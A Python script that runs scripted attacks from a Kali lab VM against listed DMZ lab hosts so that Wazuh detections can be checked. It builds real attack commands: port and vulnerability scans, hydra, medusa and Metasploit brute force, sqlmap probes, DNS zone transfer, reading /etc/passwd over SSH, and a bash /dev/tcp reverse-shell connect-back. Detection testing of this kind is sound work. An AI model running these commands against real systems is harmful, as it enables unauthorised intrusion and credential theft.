#!/usr/bin/env python3
"""
SENTINEL-AI :: Kali-side attack runner
======================================

Runs LOCALLY on the Kali VM (10.70.0.10). Attacks DMZ targets through
pfSense. Saves output to ~/attack_runs/ for later correlation against
Wazuh from a host that CAN reach the manager.

No SSH wrapping, no Wazuh API queries from here (Kali can't reach SOC
by design - that's the whole point of the architecture).

Usage:
    python3 kali_attacker.py
"""
from __future__ import annotations

import argparse
import atexit
import json
import shlex
import socket
import subprocess
import sys
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List


# ─── Defaults ──────────────────────────────────────────────────────────

# Hardcoded DMZ targets - update if you add/remove victims.
# Use one of these names anywhere "target" is requested.
KNOWN_TARGETS = [
    {"name": "srv-ad-dns",   "ip": "10.50.0.10", "os": "Windows Server 2019"},
    {"name": "srv-dns-bind", "ip": "10.50.0.11", "os": "Ubuntu 24.04"},
    {"name": "srv-web",      "ip": "10.50.0.12", "os": "Ubuntu 24.04 (DVWA)"},
    {"name": "srv-sql",      "ip": "10.50.0.13", "os": "RHEL 10 (MySQL)"},
    {"name": "srv-ftp",      "ip": "10.50.0.14", "os": "Windows 10 (IIS FTP)"},
]

# Where to store run output on Kali itself
OUTPUT_DIR = Path.home() / "attack_runs"

# Lab SSH key for post-exploitation attacks (privesc_enum, reverse_shell).
# This must already be on Kali at this path. Generate one and authorize on
# DMZ targets if you want to use the post-ex attacks.
KALI_LAB_KEY = "/root/.ssh/lab_id_rsa"


class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"; CYAN = "\033[36m"


def hdr(s):  print(f"\n{C.BOLD}{C.CYAN}=== {s} ==={C.RESET}")
def ok(s):   print(f"{C.GREEN}+ {s}{C.RESET}")
def warn(s): print(f"{C.YELLOW}! {s}{C.RESET}")
def err(s):  print(f"{C.RED}x {s}{C.RESET}")
def info(s): print(f"{C.DIM}  {s}{C.RESET}")


# ─── Local command execution ──────────────────────────────────────────


def run_streaming(command: str, log_path: Path) -> str:
    """Run a shell command locally on Kali, stream output to console
    and to log_path. Returns combined output as string."""
    log_path.parent.mkdir(parents=True, exist_ok=True)
    chunks: List[str] = []
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
    except Exception as e:
        msg = f"[exec failed: {e}]"
        log_path.write_text(msg); err(msg); return msg

    with log_path.open("w") as fh:
        fh.write(f"# command: {command}\n")
        fh.write(f"# started: {datetime.now(timezone.utc).isoformat()}\n\n")
        try:
            assert proc.stdout is not None
            for line in proc.stdout:
                print(f"    {line}", end="")
                fh.write(line); fh.flush()
                chunks.append(line)
        except KeyboardInterrupt:
            proc.terminate()
            warn("interrupted - terminating command")
            try: proc.wait(timeout=5)
            except subprocess.TimeoutExpired: proc.kill()
            raise
        proc.wait()
        fh.write(
            f"\n# exited: code={proc.returncode}  "
            f"at={datetime.now(timezone.utc).isoformat()}\n"
        )
    return "".join(chunks)


# ─── Attacks ──────────────────────────────────────────────────────────


@dataclass
class Attack:
    key: str
    name: str
    desc: str
    needs_port: List[int] = field(default_factory=list)
    needs_lab_key: bool = False


ATTACKS: Dict[str, Attack] = {
    "recon_basic":      Attack("recon_basic",      "Recon: nmap basic TCP scan",
                               "nmap -sT -T4 against top 100 ports"),
    "recon_aggressive": Attack("recon_aggressive", "Recon: nmap aggressive (-A -O)",
                               "OS detection, version detection, default scripts"),
    "recon_stealth":    Attack("recon_stealth",    "Recon: nmap SYN stealth + slow",
                               "-sS -T1 against common ports"),
    "recon_vuln":       Attack("recon_vuln",       "Recon: nmap vulnerability scripts",
                               "--script=vuln category scripts"),
    "ssh_brute":        Attack("ssh_brute",        "SSH brute force (hydra)",
                               "hydra with 2 users x 5 passwords = 10 attempts",
                               needs_port=[22]),
    "ssh_brute_medusa": Attack("ssh_brute_medusa", "SSH brute force (medusa)",
                               "medusa same wordlist",
                               needs_port=[22]),
    "auth_failures":    Attack("auth_failures",    "Auth: 10 failed ssh logins",
                               "BatchMode=yes against fake users",
                               needs_port=[22]),
    "web_nikto":        Attack("web_nikto",        "Web: nikto scan",
                               "full nikto run against port 80",
                               needs_port=[80]),
    "web_gobuster":     Attack("web_gobuster",     "Web: gobuster dir enum",
                               "common.txt wordlist",
                               needs_port=[80]),
    "web_sqlmap":       Attack("web_sqlmap",       "Web: sqlmap probe",
                               "basic SQLi probe, --batch",
                               needs_port=[80]),
    "web_dvwa_probe":   Attack("web_dvwa_probe",   "Web: DVWA reachability + login attempt",
                               "curl /dvwa/, attempt login admin:password",
                               needs_port=[80]),
    "ftp_anon":         Attack("ftp_anon",         "FTP: anonymous login check",
                               "curl ftp://target/ with anonymous creds",
                               needs_port=[21]),
    "ftp_brute":        Attack("ftp_brute",        "FTP: hydra brute force",
                               "hydra with weak credential list",
                               needs_port=[21]),
    "mysql_brute":      Attack("mysql_brute",      "MySQL: hydra brute force",
                               "hydra against MySQL port 3306",
                               needs_port=[3306]),
    "dns_axfr":         Attack("dns_axfr",         "DNS: AXFR zone transfer attempt",
                               "dig axfr against BIND server",
                               needs_port=[53]),
    "privesc_enum":     Attack("privesc_enum",     "Post-ex: passive enum via SSH",
                               "sudo -l, suid, kernel, etc.",
                               needs_port=[22], needs_lab_key=True),
    "reverse_shell":    Attack("reverse_shell",    "Post-ex: reverse shell test",
                               "ncat listener + victim connect-back",
                               needs_port=[22], needs_lab_key=True),
    "msf_smb_login":    Attack("msf_smb_login",    "Metasploit: SMB login scanner",
                               "auxiliary/scanner/smb/smb_login"),
    "msf_ssh_version":  Attack("msf_ssh_version",  "Metasploit: SSH version scan",
                               "auxiliary/scanner/ssh/ssh_version",
                               needs_port=[22]),
    "msf_http_enum":    Attack("msf_http_enum",    "Metasploit: HTTP enum",
                               "http_version + dir_scanner",
                               needs_port=[80]),
}


# ─── Command builders ─────────────────────────────────────────────────


def cmd_recon_basic(t):       return f"nmap -sT -T4 --top-ports 100 -Pn {t}"
def cmd_recon_aggressive(t):  return f"nmap -sS -A -O -T4 -Pn -p 22,80,443,3306,3389,5432,5900,8080 {t}"
def cmd_recon_stealth(t):     return f"nmap -sS -T1 --max-rate 5 -Pn -p 22,80,443,3306,3389,5900 {t}"
def cmd_recon_vuln(t):        return f"nmap --script=vuln -T4 -Pn -p 22,80,443 {t}"


def cmd_ssh_brute(t):
    users = "louay\nadmin"
    pwds  = "wrong1\nwrong2\nletmein\npassword\nadmin123"
    return (f"echo -e {shlex.quote(users)} > /tmp/u.txt && "
            f"echo -e {shlex.quote(pwds)}  > /tmp/p.txt && "
            f"hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -W 2 -f -I ssh://{t}; "
            f"rm -f /tmp/u.txt /tmp/p.txt")


def cmd_ssh_brute_medusa(t):
    users = "louay\nadmin"
    pwds  = "wrong1\nwrong2\nqwerty\n12345"
    return (f"echo -e {shlex.quote(users)} > /tmp/u.txt && "
            f"echo -e {shlex.quote(pwds)}  > /tmp/p.txt && "
            f"medusa -h {t} -U /tmp/u.txt -P /tmp/p.txt -M ssh -t 1 -F; "
            f"rm -f /tmp/u.txt /tmp/p.txt")


def cmd_auth_failures(t):
    return ("for u in nosuchuser1 nosuchuser2 admin1 admin2 root1 root2 "
            "test1 test2 fakeuser1 fakeuser2; do "
            "  echo \"--- trying $u ---\"; "
            f"  ssh -o BatchMode=yes -o StrictHostKeyChecking=no "
            f"     -o ConnectTimeout=3 -o NumberOfPasswordPrompts=0 "
            f"     $u@{t} 'true' 2>&1; "
            "  sleep 1; "
            "done")


def cmd_web_nikto(t):     return f"nikto -h http://{t}/ -Tuning 1,2,3,4,5,6,7,8,9,0,a,b,c"
def cmd_web_gobuster(t):  return f"gobuster dir -u http://{t}/ -w /usr/share/wordlists/dirb/common.txt -t 10 --no-error"
def cmd_web_sqlmap(t):    return (f"sqlmap -u 'http://{t}/?id=1' --batch --level=1 --risk=1 "
                                  f"--threads=1 --timeout=10 --retries=1 --crawl=0 --technique=B")


def cmd_web_dvwa_probe(t):
    return (
        f"echo '--- reachability ---'; "
        f"curl -s -o /dev/null -w 'HTTP %{{http_code}} on /\\n' http://{t}/; "
        f"echo '--- DVWA login page ---'; "
        f"curl -s -o /dev/null -w 'HTTP %{{http_code}} on /dvwa/login.php\\n' http://{t}/dvwa/login.php; "
        f"echo '--- attempt login admin/password ---'; "
        f"curl -s -c /tmp/dvwa.jar -b /tmp/dvwa.jar "
        f"  -d 'username=admin&password=password&Login=Login' "
        f"  -o /dev/null -w 'login HTTP %{{http_code}}\\n' "
        f"  http://{t}/dvwa/login.php; "
        f"rm -f /tmp/dvwa.jar"
    )


def cmd_ftp_anon(t):
    return (
        f"echo '--- anonymous login attempt ---'; "
        f"curl -sS --connect-timeout 5 -u anonymous: ftp://{t}/ 2>&1 | head -20; "
        f"echo '--- ftpuser:Welcome1 attempt (known weak cred) ---'; "
        f"curl -sS --connect-timeout 5 -u ftpuser:Welcome1 ftp://{t}/ 2>&1 | head -20"
    )


def cmd_ftp_brute(t):
    users = "ftpuser\nadmin\nanonymous"
    pwds  = "wrong1\nWelcome1\npassword\nadmin123\n12345"
    return (f"echo -e {shlex.quote(users)} > /tmp/fu.txt && "
            f"echo -e {shlex.quote(pwds)}  > /tmp/fp.txt && "
            f"hydra -L /tmp/fu.txt -P /tmp/fp.txt -t 1 -W 2 -f ftp://{t}; "
            f"rm -f /tmp/fu.txt /tmp/fp.txt")


def cmd_mysql_brute(t):
    users = "root\nadmin\ndvwa"
    pwds  = "wrong1\np@ssw0rd\nadmin123\npassword"
    return (f"echo -e {shlex.quote(users)} > /tmp/mu.txt && "
            f"echo -e {shlex.quote(pwds)}  > /tmp/mp.txt && "
            f"hydra -L /tmp/mu.txt -P /tmp/mp.txt -t 1 -W 2 -f mysql://{t}; "
            f"rm -f /tmp/mu.txt /tmp/mp.txt")


def cmd_dns_axfr(t):
    # Try AXFR for the lab's primary zone (matches the BIND config)
    return (
        f"echo '--- AXFR sentinel.lab ---'; "
        f"dig axfr sentinel.lab @{t}; "
        f"echo '--- AXFR reverse zone ---'; "
        f"dig axfr 0.50.10.in-addr.arpa @{t}"
    )


def cmd_privesc_enum(t):
    enum = (
        "echo '== whoami =='; whoami; "
        "echo '== id =='; id; "
        "echo '== sudo -l =='; sudo -n -l 2>&1; "
        "echo '== suid binaries =='; find / -perm -4000 -type f 2>/dev/null; "
        "echo '== world-writable dirs =='; find / -perm -o+w -type d 2>/dev/null | head -30; "
        "echo '== kernel =='; uname -a; "
        "echo '== /etc/passwd =='; cat /etc/passwd; "
        "echo '== shadow readable? =='; ls -la /etc/shadow 2>&1; "
        "echo '== running services =='; ss -tlnp 2>/dev/null"
    )
    return (f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
            f"-o LogLevel=ERROR -i {KALI_LAB_KEY} root@{t} {shlex.quote(enum)}")


def cmd_reverse_shell(t):
    port = 4444
    return (
        f"(ncat -lvnp {port} >/tmp/rs.out 2>&1 &) && sleep 1 && "
        f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
        f"-o LogLevel=ERROR -i {KALI_LAB_KEY} root@{t} "
        f"\"bash -c 'echo \\\"REVERSESHELL_TEST_$(hostname)\\\" > /dev/tcp/$SSH_CLIENT/{port}'\" 2>&1; "
        f"sleep 2 && pkill -f 'ncat -lvnp {port}' 2>/dev/null; "
        f"echo '--- listener output ---'; cat /tmp/rs.out 2>/dev/null; "
        f"rm -f /tmp/rs.out"
    )


def cmd_msf_smb_login(t):
    return (f"msfconsole -q -x \"use auxiliary/scanner/smb/smb_login; "
            f"set RHOSTS {t}; set USERNAME admin; "
            f"set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt; "
            f"set VERBOSE false; set BRUTEFORCE_SPEED 1; run; exit\"")


def cmd_msf_ssh_version(t):
    return (f"msfconsole -q -x \"use auxiliary/scanner/ssh/ssh_version; "
            f"set RHOSTS {t}; run; exit\"")


def cmd_msf_http_enum(t):
    return (f"msfconsole -q -x \""
            f"use auxiliary/scanner/http/http_version; set RHOSTS {t}; run; "
            f"use auxiliary/scanner/http/dir_scanner; set RHOSTS {t}; "
            f"set DICTIONARY /usr/share/wordlists/dirb/common.txt; set THREADS 5; run; "
            f"exit\"")


COMMAND_BUILDERS = {
    "recon_basic":      cmd_recon_basic,
    "recon_aggressive": cmd_recon_aggressive,
    "recon_stealth":    cmd_recon_stealth,
    "recon_vuln":       cmd_recon_vuln,
    "ssh_brute":        cmd_ssh_brute,
    "ssh_brute_medusa": cmd_ssh_brute_medusa,
    "auth_failures":    cmd_auth_failures,
    "web_nikto":        cmd_web_nikto,
    "web_gobuster":     cmd_web_gobuster,
    "web_sqlmap":       cmd_web_sqlmap,
    "web_dvwa_probe":   cmd_web_dvwa_probe,
    "ftp_anon":         cmd_ftp_anon,
    "ftp_brute":        cmd_ftp_brute,
    "mysql_brute":      cmd_mysql_brute,
    "dns_axfr":         cmd_dns_axfr,
    "privesc_enum":     cmd_privesc_enum,
    "reverse_shell":    cmd_reverse_shell,
    "msf_smb_login":    cmd_msf_smb_login,
    "msf_ssh_version":  cmd_msf_ssh_version,
    "msf_http_enum":    cmd_msf_http_enum,
}


# ─── Port probing ─────────────────────────────────────────────────────


def probe_ports(ip: str, ports: List[int]) -> Dict[int, bool]:
    out = {}
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        try:
            s.connect((ip, p)); out[p] = True
        except Exception:
            out[p] = False
        finally:
            s.close()
    return out


# ─── Interactive prompt ───────────────────────────────────────────────


def prompt_multi_select(items, label, display_keys):
    hdr(f"Select {label}")
    for i, it in enumerate(items, 1):
        print(f"  [{i:2d}] " + "  ".join(str(it.get(k, '?')) for k in display_keys))
    print(f"  [{C.BOLD}all{C.RESET}] select everything")
    print(f"  [{C.BOLD}q{C.RESET}]   quit")
    while True:
        s = input(f"{C.BOLD}{label}> {C.RESET}").strip().lower()
        if s in ("q", "quit", "exit"): sys.exit(0)
        if s == "all": return list(range(len(items)))
        try:
            picks = set()
            for chunk in s.replace(" ", "").split(","):
                if not chunk: continue
                if "-" in chunk:
                    a, b = chunk.split("-", 1)
                    picks.update(range(int(a), int(b) + 1))
                else:
                    picks.add(int(chunk))
            picks = [p - 1 for p in picks if 1 <= p <= len(items)]
            if picks: return sorted(set(picks))
        except ValueError:
            pass
        warn("invalid input, try again")


# ─── Main ─────────────────────────────────────────────────────────────


def main():
    ap = argparse.ArgumentParser(description="SENTINEL-AI :: Kali attack runner")
    ap.add_argument("--no-prompt", action="store_true",
                    help="Run ALL attacks against ALL targets non-interactively")
    args = ap.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    hdr("SENTINEL-AI Commander :: Kali Attack Runner")
    info(f"Attacker: $(hostname -I)")
    info(f"Output:   {OUTPUT_DIR}")

    if args.no_prompt:
        targets = KNOWN_TARGETS
        attacks = list(ATTACKS.values())
    else:
        target_idx = prompt_multi_select(
            KNOWN_TARGETS, "targets",
            display_keys=["name", "ip", "os"],
        )
        targets = [KNOWN_TARGETS[i] for i in target_idx]

        attack_items = [
            {"key": a.key, "name": a.name, "desc": a.desc}
            for a in ATTACKS.values()
        ]
        attack_idx = prompt_multi_select(
            attack_items, "attacks",
            display_keys=["name", "desc"],
        )
        attacks = [ATTACKS[attack_items[i]["key"]] for i in attack_idx]

    hdr("Probing service ports on targets")
    probes: Dict[str, Dict[int, bool]] = {}
    for t in targets:
        results = probe_ports(t["ip"], [21, 22, 53, 80, 443, 3306, 3389, 5432, 5900, 8080])
        probes[t["ip"]] = results
        open_ports = [p for p, ok_ in results.items() if ok_]
        info(f"{t['name']:25} {t['ip']:15}  open: {open_ports}")

    # Lab key check
    if any(a.needs_lab_key for a in attacks):
        if not Path(KALI_LAB_KEY).is_file():
            err(f"missing lab key at {KALI_LAB_KEY} — privesc/reverse_shell will fail")
            warn("continuing anyway with other attacks")

    runs: List[Dict[str, Any]] = []
    run_stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    for t in targets:
        target_ip = t["ip"]; target_name = t["name"]
        open_ports = {p for p, ok_ in probes[target_ip].items() if ok_}
        for atk in attacks:
            if atk.needs_port and not any(p in open_ports for p in atk.needs_port):
                warn(f"skip {atk.key} on {target_name} - needs ports {atk.needs_port}")
                continue
            hdr(f"[{target_name} :: {target_ip}] {atk.name}")
            info(atk.desc)
            cmd = COMMAND_BUILDERS[atk.key](target_ip)

            log_path = OUTPUT_DIR / f"{run_stamp}_{target_name}_{atk.key}.log"
            t0 = datetime.now(timezone.utc).isoformat()
            print(f"{C.DIM}+ {cmd[:120]}{'...' if len(cmd) > 120 else ''}{C.RESET}")
            print(f"{C.DIM}  log: {log_path}{C.RESET}")
            print(f"{C.DIM}  --- live output ---{C.RESET}")
            output = run_streaming(cmd, log_path)
            t1 = datetime.now(timezone.utc).isoformat()
            print(f"{C.DIM}  --- end output ({len(output.splitlines())} lines) ---{C.RESET}")

            runs.append({
                "target": target_name,
                "target_ip": target_ip,
                "attack": atk.key,
                "attack_name": atk.name,
                "t0": t0,
                "t1": t1,
                "log_path": str(log_path),
                "output_lines": len(output.splitlines()),
            })

    hdr("Run summary")
    print(f"  {'target':25} {'attack':30} {'lines':>8}  log")
    print(f"  {'-'*25} {'-'*30} {'-'*8}  {'-'*40}")
    for r in runs:
        log_short = Path(r["log_path"]).name
        print(f"  {r['target']:25} {r['attack']:30} {r['output_lines']:>8}  {log_short}")

    results_path = OUTPUT_DIR / f"results_{run_stamp}.json"
    results_path.write_text(json.dumps(runs, indent=2))
    ok(f"results: {results_path}")
    ok(f"per-attack logs in: {OUTPUT_DIR}")
    info("To correlate with Wazuh, query the indexer from a host that")
    info("can reach 10.60.0.10 (SOC bridge) or 127.0.0.1:50002 on dev box.")
    info("Use the t0/t1 timestamps from results.json as the time window.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(); warn("interrupted"); sys.exit(130)
